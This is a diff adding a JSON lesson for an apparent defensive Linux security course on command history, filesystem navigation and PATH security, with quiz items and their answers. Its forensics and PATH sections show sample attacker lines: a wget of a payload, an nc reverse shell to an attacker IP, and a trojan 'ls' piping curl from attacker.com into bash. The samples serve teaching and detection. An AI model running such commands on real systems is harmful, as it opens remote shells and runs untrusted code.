@@ -1,0 +1,141 @@
+{
+  "lesson_id": "c3e5f7a8-2b4d-4c8e-a0f1-3d5e7b9c1d2a",
+  "domain": "linux",
+  "title": "Linux Command History and Navigation",
+  "difficulty": 1,
+  "order_index": 32,
+  "prerequisites": ["Linux Terminals and Manual Pages"],
+  "concepts": [
+    "Command history expansion",
+    "History file and environment variables",
+    "Directory navigation shortcuts",
+    "Absolute vs relative paths",
+    "Filesystem Hierarchy Standard (FHS)",
+    "Pushd/popd directory stack",
+    "History security implications",
+    "Path resolution and PATH variable"
+  ],
+  "estimated_time": 35,
+  "learning_objectives": [
+    "Use command history expansion to recall and modify previous commands",
+    "Navigate the filesystem efficiently using absolute and relative paths",
+    "Understand FHS and locate critical system directories",
+    "Secure command history to prevent credential leakage",
+    "Manipulate the PATH variable for security and convenience"
+  ],
+  "post_assessment": [
+    {
+      "question": "Which command recalls and executes the last command starting with 'ssh'?",
+      "options": [
+        "!!ssh",
+        "!ssh",
+        "history ssh",
+        "^ssh"
+      ],
+      "correct_answer": "B",
+      "explanation": "`!ssh` searches your history for the most recent command starting with 'ssh' and executes it. `!!` reruns the very last command. `^old^new` performs substitution on the last command."
+    },
+    {
+      "question": "Where does bash store command history by default?",
+      "options": [
+        "/etc/bash_history",
+        "~/.bash_history",
+        "/var/log/history",
+        "~/.history"
+      ],
+      "correct_answer": "B",
+      "explanation": "Bash stores history in `~/.bash_history` by default. This file is written when the shell exits. The `HISTFILE` variable can change this location. In security-sensitive contexts, you may want to disable history for certain sessions."
+    },
+    {
+      "question": "What does the PATH variable determine?",
+      "options": [
+        "The current working directory",
+        "The directories the shell searches for executables",
+        "The location of configuration files",
+        "The user's home directory path"
+      ],
+      "correct_answer": "B",
+      "explanation": "PATH is a colon-separated list of directories. When you type a command without a path, the shell searches each PATH directory in order. This is why `.` (current directory) should NOT be in PATH — it allows attackers to place malicious binaries with common names in directories you traverse."
+    },
+    {
+      "question": "According to FHS, what is /etc used for?",
+      "options": [
+        "User home directories",
+        "Host-specific system configuration files",
+        "Temporary files",
+        "Shared libraries"
+      ],
+      "correct_answer": "B",
+      "explanation": "/etc contains host-specific configuration files — not to be edited casually. It comes from 'et cetera' historically, but in FHS it means 'everything to configure'. Critical security files here include /etc/shadow, /etc/passwd, /etc/ssh/sshd_config."
+    }
+  ],
+  "jim_kwik_principles": [
+    "Active Recall",
+    "Spaced Repetition",
+    "Association",
+    "Chunking",
+    "Mnemonics",
+    "Movement",
+    "Simplification",
+    "Feynman Technique",
+    "Pattern Recognition",
+    "Elaborative Rehearsal"
+  ],
+  "content_blocks": [
+    {
+      "type": "mindset_coach",
+      "title": "Efficiency is a Security Skill",
+      "content": "Slow responders miss indicators. If you're hunting through your terminal history with arrow keys one line at a time, you're wasting seconds that add up to minutes during an incident.\n\nCommand history mastery and filesystem navigation fluency are *force multipliers*. They let you spend your cognitive bandwidth on *analysis*, not *typing*.\n\nThis lesson teaches the shortcuts that experienced Linux users use without thinking — so you can get there faster.",
+      "principle": "Simplification"
+    },
+    {
+      "type": "explanation",
+      "title": "Command History: Your Undo Buffer",
+      "content": "Bash maintains a history of commands you've typed. This isn't just convenience — it's an **audit trail** and a **productivity system**.\n\n**Essential history commands:**\n\n| Command | What it does |\n|---------|-------------|\n| `history` | Show full history list |\n| `!!` | Re-run last command |\n| `!ssh` | Re-run last command starting with 'ssh' |\n| `!1234` | Re-run command #1234 from history |\n| `!$` | Last argument of previous command |\n| `!^` | First argument of previous command |\n| `!*` | All arguments of previous command |\n| `^old^new` | Replace 'old' with 'new' in last command |\n| `Ctrl+R` | Reverse search through history |\n\n**History expansion with modifiers:**\n```bash\n# Run last cat command but show it first (don't execute)\n!cat:p\n\n# Extract just the directory from last command\nls !$:h    # If last was 'ls /var/log/syslog', this gives '/var/log'\n```\n\n**Environment variables:**\n- `HISTSIZE` — How many commands to keep in memory (default: 500)\n- `HISTFILESIZE` — How many to save to disk (default: 500)\n- `HISTCONTROL=ignorespace` — Lines starting with space don't save (SECURITY!)\n- `HISTCONTROL=ignoredups` — Don't save duplicate consecutive commands\n- `HISTIGNORE='ls:cd:exit'` — Never save these commands\n\n**Security implications:**\n- History files may contain passwords typed on command lines\n- `HISTCONTROL=ignorespace` lets you run sensitive commands with a leading space to avoid logging\n- Check `.bash_history` during forensics for attacker activity\n- Attackers often `unset HISTFILE` or `history -c` to cover tracks"
+    },
+    {
+      "type": "explanation",
+      "title": "Filesystem Navigation and FHS",
+      "subtitle": "Teach Me Like I'm 10",
+      "content": "Imagine your computer's filesystem is like a big office building:\n\n- **/** (root) — The lobby. Everything starts here.\n- **/bin** — The tool closet. Essential tools everyone needs (ls, cp, bash).\n- **/sbin** — The maintenance room. Admin-only tools (fdisk, iptables).\n- **/etc** — The policy office. Configuration files that say how everything should work.\n- **/home** — Everyone's personal desk. Your files live here.\n- **/root** — The boss's office. The admin's home directory.\n- **/var** — The filing cabinet that keeps growing. Logs, mail, spool files.\n- **/tmp** — The shredder bin. Temporary stuff anyone can use. Gets cleaned out.\n- **/usr** — The library. Programs, docs, source code.\n- **/dev** — The equipment room. Every hardware device is a file here.\n- **/proc** — The x-ray machine. It shows you what's happening inside the kernel right now.\n\n**Navigation shortcuts:**\n- `cd -` — Go back to previous directory (like hitting Back)\n- `cd ~` or just `cd` — Go home\n- `pushd /var/log` — Save current dir and go to /var/log\n- `popd` — Return to saved directory\n- `cd ..` — Go up one level\n- `cd ../..` — Go up two levels\n\n**Absolute vs Relative paths:**\n- Absolute: `/var/log/auth.log` — Start from root, full path\n- Relative: `log/auth.log` — Start from where you are now"
+    },
+    {
+      "type": "code_exercise",
+      "title": "History and Navigation Drills",
+      "content": "Practice the commands that will save you hours over your career.",
+      "language": "bash",
+      "starter_code": "# 1. View your command history\n# 2. Run reverse search (Ctrl+R, type 'ssh')\n# 3. Re-run the last command that started with 'ls'\n# 4. Create a directory stack with pushd\n# 5. Navigate to /var/log, then back to home\n# 6. Find out what directory you're in\n# 7. List files in /etc with their types\n# 8. Check your HISTSIZE setting",
+      "solution": "# 1. View your command history\nhistory\n\n# 2. Reverse search (interactive - press Ctrl+R then type pattern)\n# Ctrl+R, type 'ssh'\n\n# 3. Re-run the last command that started with 'ls'\n!ls\n\n# 4. Create a directory stack\npushd /var/log\npushd /etc\npopd    # Back to /var/log\npopd    # Back to original\n\n# 5. Navigate to /var/log, then back to home\ncd /var/log && cd ~\n# or: cd /var/log && cd -\n\n# 6. Find out what directory you're in\npwd\n\n# 7. List files in /etc with their types\nls -F /etc | head -20\n\n# 8. Check your HISTSIZE setting\necho $HISTSIZE",
+      "hint": "Use 'history' to see all commands. Use '!prefix' for history expansion. Use 'pushd/popd' for directory stack. Use 'pwd' to see current directory."
+    },
+    {
+      "type": "real_world",
+      "title": "History as Forensic Evidence",
+      "content": "During an incident response, command history is one of your first stops:\n\n```bash\n# Check the compromised user's history\ncat /home/compromised_user/.bash_history\n\n# Check root's history (if attacker escalated)\ncat /root/.bash_history\n\n# Look for common attacker patterns in history\ngrep -E '(wget|curl|chmod|nc|ncat|/dev/tcp)' /home/*/.bash_history\n\n# Check if history was disabled (suspicious!)\n# Look for: unset HISTFILE, history -c, HISTSIZE=0\n```\n\n**What attackers leave in history:**\n- `wget http://malicious.com/payload.sh` — downloading tools\n- `chmod +x payload.sh && ./payload.sh` — executing payloads\n- `nc -e /bin/bash attacker_ip 4444` — reverse shells\n- `unset HISTFILE` — disabling history to cover tracks\n\n**What defenders should configure:**\n- Set `HISTTIMEFORMAT='%F %T '` to timestamp every command\n- Increase `HISTSIZE` and `HISTFILESIZE` to 10000+\n- Don't use `ignorespace` in sensitive environments — you want EVERYTHING logged\n- Consider centralized logging of all commands (auditd, syslog)",
+      "scenario": "You find that .bash_history is empty on a suspected compromised server, but /root/.bash_history contains commands run 2 hours after the reported breach time. What does this tell you about the attacker's behavior?"
+    },
+    {
+      "type": "memory_aid",
+      "title": "FHS Key Directories — The ELSB Mnemonic",
+      "content": "Remember the most security-relevant directories:\n\n**E.L.S.B. + V.D.P**\n\n- **E**tc — Config files (the policy office)\n- **L**ib — Shared libraries\n- **S**bin — System admin binaries\n- **B**in — User binaries\n- **V**ar — Variable data (logs, mail, spools)\n- **D**ev — Device files\n- **P**roc — Process/kernel info (virtual filesystem)\n\n**Security-critical paths to memorize:**\n- `/etc/shadow` — Password hashes\n- `/etc/passwd` — User info\n- `/etc/ssh/sshd_config` — SSH server config\n- `/var/log/` — System logs\n- `/proc/<pid>/` — Running process details",
+      "technique": "acronym"
+    },
+    {
+      "type": "explanation",
+      "title": "The PATH Variable: A Security Vector",
+      "content": "The **PATH** variable controls where the shell looks for executables when you type a command without a full path.\n\n```bash\necho $PATH\n# Typical: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n```\n\n**How PATH-based attacks work:**\n\nIf `.` (current directory) is in PATH, or if a writable directory appears before system directories:\n\n```bash\n# Attacker places a trojan in /tmp\n# If PATH includes /tmp before /bin:\necho '#!/bin/bash' > /tmp/ls\necho 'curl attacker.com/backdoor | bash' >> /tmp/ls\nchmod +x /tmp/ls\n# Now when someone types 'ls' in /tmp, the trojan runs first!\n```\n\n**Secure PATH practices:**\n1. Never include `.` or empty entries (`::`) in PATH\n2. Keep system directories (`/usr/bin`, `/bin`) before user-writable ones\n3. Verify your PATH: `echo $PATH | tr ':' '\\n' | ls -ld`\n4. Use full paths for critical commands: `/usr/bin/sudo`, `/bin/mount`\n\n**Relative path attacks in sudo:**\n```bash\n# Dangerous sudo config:\nuser ALL=(ALL) /bin/cat\n# If user runs 'sudo cat /etc/shadow' from a directory\n# containing a malicious 'cat' binary... actually sudo uses\n# PATH differently, but the principle matters.\n```\n\n**Check your PATH security:**\n```bash\n# Find writable directories in your PATH\necho $PATH | tr ':' '\\n' | while read d; do [ -w \"$d\" ] && echo \"WRITABLE: $d\"; done\n```"
+    },
+    {
+      "type": "reflection",
+      "title": "Navigation Muscle Memory",
+      "content": "Practice these until they're automatic:\n\n1. **`cd -`** — Flip between two directories. Use this constantly.\n2. **`Ctrl+R`** — Reverse search. This is the single most useful history shortcut.\n3. **`Alt+.`** — Insert last argument from previous command (in most terminals).\n4. **`!!`** — Rerun last command. Most useful with `sudo !!`\n5. **`!$`** — Reuse last argument. `mkdir long_directory_name && cd !$`\n\n**Your challenge:** For the next 3 days, ban yourself from using arrow keys to scroll through history. Use `Ctrl+R` and `!prefix` instead. It will feel slow at first and then become second nature.\n\n**Security question:** If you were auditing a system, what would an empty `.bash_history` tell you? What about a history that only starts from a recent date?"
+    },
+    {
+      "type": "mindset_coach",
+      "title": "Muscle Memory Builds Speed",
+      "content": "In incident response, speed comes from muscle memory, not thinking. When you can navigate without conscious effort, your brain is free to analyze.\n\nYou've learned:\n- History expansion (!!, !prefix, ^old^new)\n- FHS directory structure\n- PATH security\n- Navigation shortcuts (cd -, pushd/popd)\n\n**Your next step:** Set `HISTSIZE=10000` and `HISTFILESIZE=10000` in your `.bashrc`. Add `HISTTIMEFORMAT='%F %T '`. This gives you a rich, timestamped command log that's invaluable for both productivity and forensics.",
+      "principle": "Active Recall"
+    }
+  ],
+  "tags": ["Course: SANS-SEC406", "Career Path: Blue Teamer"]
+}
